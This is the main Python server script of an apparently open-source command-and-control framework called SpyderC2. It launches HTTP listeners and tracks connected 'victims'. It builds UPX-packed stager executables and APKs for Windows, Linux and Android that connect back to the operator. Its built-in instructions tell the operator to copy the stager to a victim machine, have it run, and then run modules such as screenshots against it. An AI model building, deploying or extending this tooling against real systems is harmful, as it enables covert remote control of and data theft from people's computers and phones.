import pdb
import pymongo
import re
import os
import shutil
import subprocess
import argparse
from lib.logger import Logger
from termcolor import colored
import datetime
import pathlib
import signal
import socket
import traceback
from rich.prompt import Prompt
from rich.traceback import install
from rich.console import Console
from rich.prompt import Confirm
from rich.panel import Panel
from rich import print as pprint
from lib.style import Style
from subprocess import Popen, PIPE
import glob

install(show_locals=True,max_frames=5)
console = Console()

def create_table(title,column,row):
	from rich.console import Console
	from rich.table import Table

	table = Table(title=title)

	for key in column.keys():
		attrs = column[key]
		table.add_column(key,**attrs)

	for key in row.keys():
		attrs = row[key]
		table.add_row(*attrs)

	

	console = Console()
	console.print(table, justify="center")


## Provides command history like bash to input
import readline

## Full path of the current script
PATH = os.path.dirname(os.path.realpath(__file__))

def parser():
	parser = argparse.ArgumentParser(description='Python based C2')
	parser.add_argument('-d', '--detached', help = "Doesn't automatically launch logs in another screen.", action='store_true')
	parser.add_argument('-c', '--clear-db', help = "Clears database when exiting / error occurs", action='store_true')
	parser.add_argument('-v', '--verbose', help = 'Verbose output', action='store_true')
	parser.add_argument('-g', '--generate', help = 'Generates stager exe', action='store_true')
	parser.add_argument('-o', '--os', action='store', type=str, help='Victim OS for generation of stager exe. Options - windows(default), linux.')
	parser.add_argument('-i', '--ip', action='store', type=str, help='Listener IP for generation of stager exe. Default - 0.0.0.0')
	parser.add_argument('-p', '--port', action='store', type=str, help='Listener PORT for generation of stager exe. Default - 8080')
	args = parser.parse_args()
	return args


def display_ascii_art():
	f = open(os.path.join(PATH,'ascii_art'),'r')
	print(''.join([line for line in f]))

def display_main_help_menu():
	print("")
	column = {
	"Command" : {'style':"gold3"},
	"Description":{'justify':"left", 'no_wrap':True}
	}

	row = [
		["http", "Starts a new http listener."],
		["listeners", "List existing http listener running."],
		["kill_listeners", "Kill the http listener running"],
		["generate", "generates the stager in exe format in shared/tmp folder"],
		["victims", "Show the currently connected victims"],
		["use <VICTIM ID>", "Interact with connected victims."],
		["exit", "exit the program."]
	]
	s = Style()
	s.create_table("[gold3]SERVER HELP MENU[/gold3]",column,row,'center')



## Checks if we are running on docker container
def docker():
	return os.path.isfile('/.dockerenv')

def get_victim_os():
	input = Prompt.ask("Enter Victim OS", choices=["windows", "linux", 'android', "back"], default="windows")
	return (False if input == 'back' else input)

## Stager.py has needs the server url where it will connect back and copies the new stager to tmp
def fill_server_url(os_name,args={}):
	if 'generate' in args and args['generate']:
		## This is for generting via flags, we take defalt if nothing provided
		server_ip = args['ip'] if args['ip'] else '0.0.0.0'
		server_port = args['port'] if args['port'] else '8080'
	else:
		server_ip = Prompt.ask("\nEnter listener IP", default='0.0.0.0')
		while True:
			server_port = Prompt.ask("\nEnter listener port", default='8080')
			if not server_port.isdigit():
				pprint("[yellow]Please enter Port in integer[/yellow]")
				continue
			break

	stager_path = os.path.join(PATH,'stager.py')

	stager_content = open(stager_path,'r').read()
	stager_content = stager_content.replace("##SERVER_URL##",f"{server_ip}:{server_port}")

	new_stager_name = 'stager.py'

	## We comment out psutil as it has issues with android, for android the python file name needs to be main.py
	if os_name == 'android':
		stager_content = stager_content.replace("import psutil","#import psutil")
		new_stager_name = 'main.py'

	new_stager_path = os.path.join(PATH,'shared','tmp',new_stager_name)

	f = open(new_stager_path,'w+')
	print(stager_content,file=f)
	f.close()

def print_help_text():
	print("")
	column = {
		"S.N" : {'style':"cyan"},
		"Instruction":{'justify':"left", 'no_wrap':False}
	}

	row = [
		["1.", f"Run a listener, by running [gold3]http[/gold3] command. Check logs to see if listener is started successfully."],
		["2.", f"Generate a payload/stager, by running [gold3]generate[/gold3] command. Enter your [gold3]host IP[/gold3] address, this is where the victim will contact (generally host IP). If [gold3]running on docker, you would get a help text to generate the stager[/gold3] , else it will be generated automatically."],
		["3.", f"[gold3]Copy[/gold3] this stager.exe/stager to the victim machine."],
		["4.", f"Double click the stager on the victim. You should see a new victim has joined with an ID in logs."],
		["5.", f"Check the vicitm list using [gold3]victims[/gold3] command."],
		["6.", f"To interact with victim, run [gold3]use <victim_id>[/gold3]"],
		["7.", f"Now you are in victim help menu. Run [gold3]modules[/gold3] to see the stuff you can run on the victim machine."],
		["8.", f"To run a module, [gold3]use <module_name>[/gold3] , ex : use screenshot."],
		["9.", f"You can then modify the arguments available for that module, Ex , you can set the path where screenhsot will be saved on the attacker/host machine, using 'set path /home."],
		["10.", f"Now to run this module on victim, hit [gold3]run[/gold3]"],
		["11.", f"[gold3]Check in the logs[/gold3], you will see the script/task being issue to the victim, and logs will also show where the output/screenshot is being stored."],
	]
	s = Style()
	s.create_table("[gold3]FRAMEWORK USAGE INSTRUCTIONS[/gold3]",column,row,'center')


def check_file_existence(path,file):
	if not os.path.isfile(os.path.join(path,file)):
		server_logger.info_log(f"{file} doesn't exist at {path}. Please look for the file and copy in appropriate place.")
		return False
	else:
		return True


def delete_folder_contents(folder,server_logger):
	for filename in os.listdir(folder):
		file_path = os.path.join(folder, filename)
		try:
			if os.path.isfile(file_path) or os.path.islink(file_path):
				os.unlink(file_path)
			elif os.path.isdir(file_path):
				shutil.rmtree(file_path)
		except Exception as e:
			server_logger.info_log(f"Failed to delete {file_path}. Reason: {e}",'yellow')

			## Probably the current user doesn't have the privilege to remove files from tmp
			try:
				cmd  = f'sudo rm -r {folder}/*'
				server_logger.info_log(f"\nAttempting to run {colored(cmd,'yellow')}")
				subprocess.check_output(cmd,shell=True)
				return True
			except Exception as e:
				server_logger.info_log(f"\nPlease clear the tmp directory manually and try again.",'red')
				return False

	return True


def pack_exe(server_logger,exe_path,packer_path):
	server_logger.info_log('Packing the created executable...')
	if not os.path.isfile(exe_path):
		server_logger.info_log(f'Executable not present at {exe_path}','yellow')
		return False

	if not os.path.isfile(packer_path):
		server_logger.info_log(f'Packer binary not present at {packer_path}','yellow')
		return False

	try:
		cmd  = f'{packer_path} {exe_path}'
		server_logger.info_log(f"\nAttempting to run {colored(cmd,'cyan')}")
		subprocess.check_output(cmd,shell=True)
		return True
	except Exception as e:
		server_logger.info_log(e,'red')
		return False

def runCmd(cmd,cwd=''):
	try:
		print(f"Running cmd - {cmd} in {cwd}\n")
		if cwd == '':
			process = Popen(cmd, stdout=PIPE, stderr=PIPE,shell=True)
		else:
			process = Popen(cmd, cwd=rf"{cwd}",shell=True)
		stdout, stderr = process.communicate()

		if process.returncode != 0:
			raise ValueError(stderr.decode('utf-8'))
		if stdout != None:
			op = stdout.decode('utf-8')
		else:
			op = ''
		pprint(f"Command ran successfully, output - {op}\n")
		return True
	except Exception as e:
		return False


def install_android_dependencies(path):
	res = runCmd("chmod +x install-kivy-buildozer-dependencies.sh",os.path.join(path,'../../','utilities','buildozer'))
	
	if res:
		res = runCmd("sh install-kivy-buildozer-dependencies.sh",os.path.join(path,'../../','utilities','buildozer'))
		if res:
			pprint("Successfully installed dependencies...")
			return True
		else:
			pprint("[red]Couldn't install dependencies..[/red]")
			return False
	else:
		pprint("[red]Couldn't install dependencies..[/red]")
		return False

## So here we try running buildozer directly, if it fails we run dependencies and try running again
def generate_android_stager(path,retry=True):
	runCmd('buildozer android debug',path)
	## The return code of the above command is not reliable so checking if the APK is generated
	files = glob.glob(rf"{os.path.join(path,'bin','*.apk')}")
	
	if len(files) != 0:
		pprint(f"\n[green]APK generation successful. Find it at {files[0]}[/green]")
		return True
	else:
		if retry:
			ans = Confirm.ask("[yellow]Do you want to install dependencies and try again ?[/yellow]")
			if ans:
				res = install_android_dependencies(path)
				if res:
					generate_android_stager(path,retry=False)
				else:
					pprint(f"\n[red]APK generation not successful.[/red]")
					return False
			else:
				pprint(f"\n[red]APK generation not successful.[/red]")
				return False
		else:
			pprint(f"\n[red]APK generation not successful.[/red]")
			return False



def copy_requirements_file(os_name,path):
	req_path = os.path.join(path,'requirements.txt')
	req_content = open(req_path,'r').read()

	## Pyinstaller linux can't build kivy
	if os_name == 'linux':
		req_content = req_content.replace("kivy","#kivy")

	new_path = os.path.join(path,'shared','tmp','requirements.txt')

	f = open(new_path,'w+')
	print(req_content,file=f)
	f.close()

def generate_stager(server_logger,args={}):
	
	if 'generate' in args and args['generate']:
		## This is for generting via flags, we take defalt if nothing provided
		os_name = args['os'] if args['os'] else 'windows'
	else:
		os_name = get_victim_os()

	if not os_name or os_name not in ['windows','linux','android']:
		server_logger.info_log('Not valid OS name, options - windows, linux, android')
		return False

	## Convert to exe and save
	if os.path.exists(os.path.join(PATH,'shared','tmp')):
		if not delete_folder_contents(os.path.join(PATH,'shared','tmp'),server_logger): return
	else:
		os.mkdir(os.path.join(PATH,'shared','tmp'))


	## We fill in the User Provided server URL in tne stager.py and move it to tmp and also comment out psutil for android
	fill_server_url(os_name,args)



	if os_name == 'android':
		if not check_file_existence(PATH,os.path.join('shared','tmp','main.py')): return
		if not check_file_existence(PATH,'buildozer.spec'): return
		shutil.copyfile(os.path.join(PATH,'buildozer.spec'),os.path.join(PATH,'shared','tmp','buildozer.spec'))
		if not check_file_existence(PATH,os.path.join('shared','tmp','buildozer.spec')): return
	else:
		if not check_file_existence(PATH,os.path.join('shared','tmp','stager.py')): return
		## Check for src files to copy
		if not check_file_existence(PATH,'stager.spec'): return
		if not check_file_existence(PATH,'requirements.txt'): return
		copy_requirements_file(os_name,PATH)
		## Copy files.
		shutil.copyfile(os.path.join(PATH,'stager.spec'),os.path.join(PATH,'shared','tmp','stager.spec'))
		
		if not check_file_existence(PATH,os.path.join('shared','tmp','stager.spec')): return
		if not check_file_existence(PATH,os.path.join('shared','tmp','requirements.txt')): return

	


	## We will attempt to pack the exe
	binary_name = 'stager.exe' if os_name == 'windows' else 'stager'
	exe_path = os.path.join(PATH,'shared','tmp','dist',os_name,binary_name)
	packer_path = os.path.join(PATH,'utilities','upx','upx')
	
	try:
		if not docker():
			server_logger.info_log("Generating stager.. Please wait, this might take some time...")
			if os_name == 'android':
				generate_android_stager(os.path.join(PATH,'shared','tmp'))
			else:
				subprocess.check_output(f'sudo docker run -v "$(pwd):/src/" cdrx/pyinstaller-{os_name} ', cwd=rf"{os.path.join(PATH,'shared','tmp')}",shell=True)

				if pack_exe(server_logger,exe_path,packer_path):
					server_logger.info_log('Sucessfully Packed exe','green')
				else:
					server_logger.info_log("Couldn't pack exe",'yellow')



				print(colored(f"\nStager dumped to {colored(f'SpyderC2/data/shared/tmp/dist/{os_name}','cyan')}. Copy it to your victim machine, once generated. Do run a HTTP server on attacker by running http command before executing stager.exe.",'green'))
		else:
			print("\n")
			if os_name == 'android':
				generate_android_stager(os.path.join(PATH,'shared','tmp'))
			else:
				cmd = f'Please run the following command in path [orange_red1]SpyderC2/data/shared/tmp[/orange_red1] on the [bold blue]HOST MACHINE [/bold blue]\n\n'

				cmd += f'CMD - [bright_cyan]sudo docker run -v "$(pwd):/src/" cdrx/pyinstaller-{os_name} && sudo ../../utilities/upx/upx ../tmp/dist/{os_name}/{binary_name}[/bright_cyan]\n\n'

				cmd += f'The stager will be generated in [orange_red1]SpyderC2/data/shared/tmp/dist/{os_name}[/orange_red1] on HOST.\nCopy it to your victim machine, once generated. Do run a HTTP server on attacker by running http command before executing stager on victim.'
				pprint(Panel(cmd, title="[red bold]ATTENTION!"))

		return True
	except subprocess.CalledProcessError as grepexc:                                                                                                   
		print(colored(f"exe generation failed ","red"))
		return False


## Attempts to kill process running on a port
def kill_process_on_port(port):
	try:
		process = subprocess.Popen(["lsof", "-i", ":{0}".format(port)], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
		stdout, stderr = process.communicate()
		for process in str(stdout.decode("utf-8")).split("\n")[1:]:       
		    data = [x for x in process.split(" ") if x != '']
		    if (len(data) <= 1):
		        continue

		    os.kill(int(data[1]), signal.SIGKILL)

		return True

	except Exception as e:
		print(colored(e,'yellow'))
		return False


def main(args,db_object,server_logger):
	myclient = db_object.mongoclient

	display_main_help_menu()
	print()

	while True:
		cmd = str(input(colored("(SpyderC2:) > ",'red')))

		if cmd == 'http':
			print()
			if docker(): pprint(Panel("For docker, the range of usable port is [cyan]8080-8100[/cyan] due to increased startup times for port forwarding. Enter accordingly, if more needed, adjust in the docker-compose.yml", title="[red bold]NOTE!"))

			while True:
				port = Prompt.ask("\nEnter listener port", default='8080')
				if not port.isdigit():
					pprint("[yellow]Please enter Port in integer[/yellow]")
					continue
				else:
					break
			obj = Listener.listener_exists(port)

			if not obj:
				## Listener object doesn't already exists for that port
				obj = Listener(port=port)
			
			ret = obj.start_listener()

			if ret:
				server_logger.info_log("\nStarted http listener.",'green')
			else:
				
				server_logger.info_log("\nFailed to start http listener. Something is running on that port.",'yellow')

				## Attempts to kill the process running on that port
				## killing with lsof doesn't work in docker
				if not docker():
					ans = Confirm.ask("Do you want to kill the process running on that port [Killing feature not reliable] ?")
					if ans:
						if kill_process_on_port(port):
							server_logger.info_log("MIGHT HAVE Successfully killed the process on that port. Try running the listener again.",'green')
						else:
							server_logger.info_log("Couldn't kill the process on that port. Try running sudo \"ss -lp 'sport = :<port>'\" and get the process Id and kill it by - \" sudo kill <pid>\"",'yellow')


		elif cmd == 'listeners':
			Listener.show_listeners()

		elif cmd == 'kill_listeners':
			Listener.kill_all_listeners()


		elif cmd == 'generate':
			generate_stager(server_logger)
			

		elif cmd == 'victims':
			## Load victims from db everytime and instatiate objects. TODO - any effcient approach?
			Victim.load_victims_from_db()
			Victim.show_victims()

		## Matching use LKF0599NMU
		elif re.match(r'^use [\w\d]{1,10}$',cmd):

			Victim.load_victims_from_db()
			victim_id = re.findall(r'^use ([\w\d]{1,10})$',cmd)[0]

			## Supporting Regex to quickly interact with part of ID.
			r = re.compile(victim_id+".*")
			matched = list(filter(r.match, Victim.victims.keys()))

			if len(matched) == 0 :
				server_logger.info_log("No victims found with that ID",'yellow')
			elif len(matched) == 1 :
				victim_id = matched[0]
				server_logger.info_log(f"Interacting with {victim_id}",'green')
				Victim.victims[victim_id].victim_menu()
			else:
				server_logger.info_log("Multiple victims found, Please provide full or unique ID.",'yellow')


		elif cmd == 'help':
			display_main_help_menu()

		elif cmd == 'exit':
			Listener.kill_all_listeners()
			if args.clear_db : db_object.drop_db()
			break
		elif cmd == '':
			print()
			pass
		else:
			print(f"Not supported. Type {colored('help','cyan')} to see commands supported.")

		print()

def get_db_info(server_logger):
	if 'MONGODB_USERNAME' not in os.environ: 
		print(colored("Enter mongodb username if any",'blue'))
		os.environ['MONGODB_USERNAME'] = str(input())

	if 'MONGODB_PASSWORD' not in os.environ: 
		print(colored("Enter mongodb password if any",'blue'))
		os.environ['MONGODB_PASSWORD'] = str(input())

	if 'MONGODB_HOSTNAME' not in os.environ: 
		os.environ['MONGODB_HOSTNAME'] = '127.0.0.1'

	if 'MONGODB_DATABASE' not in os.environ: 
		os.environ['MONGODB_DATABASE'] = 'SpyderC2'

	server_logger.info_log(f"You can set these environment variables - {colored('MONGODB_USERNAME , MONGODB_PASSWORD , MONGODB_HOSTNAME , MONGODB_DATABASE','cyan')}",'blue')

	db_url = "mongodb://"
	if os.environ['MONGODB_USERNAME'] != '' and os.environ['MONGODB_PASSWORD'] != '':
		db_url += f"{os.environ['MONGODB_USERNAME']}:{os.environ['MONGODB_PASSWORD']}@"
		
	db_url += f"{os.environ['MONGODB_HOSTNAME']}:27017/{os.environ['MONGODB_DATABASE']}"

	return db_url


if __name__=="__main__":
	args = parser()
	display_ascii_art()


	## Setting up logging
	server_logger = Logger(logdir='logs',logfile='logs',verbose=args.verbose )
	server_logger.setup()

	if args.generate:
		res = generate_stager(server_logger,vars(args))
		exit(0) if res else exit(1)

	## launches the log in new screen
	server_logger.launch_logs_screen(args)
	

	if docker(): server_logger.info_log(f"Please launch the server by running - {colored('sudo docker exec -it spyderc2_server python3 /home/attacker/SpyderC2/main.py','cyan')} ")
	

	db_url = get_db_info(server_logger)
	server_logger.info_log(f"Initiated database connection from main- {db_url}",'green')
	from lib.listener import Listener
	from lib.database import Database
	from lib.task import Task
	from lib.victim import Victim

	print_help_text()

	db_object = Database(url=db_url)
	Listener.mongoclient = db_object.mongoclient
	Victim.mongoclient = db_object.mongoclient
	Task.mongoclient = db_object.mongoclient


	## The shared path will be the volume shared b/w host and docker
	if not os.path.exists(os.path.join(PATH,'shared')):
		os.mkdir(os.path.join(PATH,'shared'))

	try:
		if db_object.db_data_exists():
			db_object.load_db_data()

		main(args,db_object,server_logger)
	except:

		## TODO - also mark all the victims dead ? Same during exit
		console.print_exception(show_locals=True,max_frames=5)
		Listener.kill_all_listeners()
		if args.clear_db : db_object.drop_db()